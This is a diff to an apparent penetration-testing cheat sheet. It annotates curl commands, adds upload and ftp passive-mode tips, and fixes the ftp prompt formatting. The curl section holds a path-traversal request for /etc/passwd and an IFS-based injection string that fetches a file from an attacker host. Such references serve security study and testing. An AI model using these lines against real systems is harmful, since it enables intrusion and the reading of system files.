@@ -416,15 +416,21 @@ $ apport-unpack /var/crash/_<PATH/TO/CRASHED/PROCESS>_<PROCESS>.1000.crash /PATH
 
 ## curl
 
+### Basic Commands
+
 ```c
-$ curl -v http://<DOMAIN>
-$ curl -X POST http://<DOMAIN>
-$ curl -I POST http://<DOMAIN>
-$ curl -X PUT http://<DOMAIN>
-$ curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd
-$ curl -s "http://<DOMAIN>/reports.php?report=2589" | grep Do -A8 | html2text
-$ curl${IFS}<LHOST>/<FILE>
+$ curl -v http://<DOMAIN>                                                        // verbose output
+$ curl -X POST http://<DOMAIN>                                                   // use POST method
+$ curl -X PUT http://<DOMAIN>                                                    // use PUT method
+$ curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
+$ curl -s "http://<DOMAIN>/reports.php?report=2589" | grep Do -A8 | html2text    // silent mode and output conversion
+$ curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
+$ curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
 ```
+
+### Reference for -X
+
+> https://daniel.haxx.se/blog/2015/09/11/unnecessary-use-of-curl-x/
 
 ### Headers
 
@@ -3196,11 +3202,11 @@ $ ftp <RHOST>
 ### Basic Commands
 
 ```c
->dir      // lsit all files and directories
->ls -a    // list all files (even hidden) (yes, they could be hidden)
->binary   // set transmission to binary instead of ascii
->ascii    // set transmission to ascii instead of binary
->bye      // exit
+ftp> dir      // lsit all files and directories
+ftp> ls -a    // list all files (even hidden) (yes, they could be hidden)
+ftp> binary   // set transmission to binary instead of ascii
+ftp> ascii    // set transmission to ascii instead of binary
+ftp> bye      // exit
 ```
 
 ### Anonymous Login
@@ -3234,6 +3240,12 @@ $ wget -m --no-passive ftp://anonymous:anonymous@<RHOST>
 
 ```c
 $ nmap -sC -sV -p 21 -vvv <RHOST>
+```
+
+### Fixing 229 Entering Extended Passive Mode
+
+```c
+ftp> passive
 ```
 
 ## getent
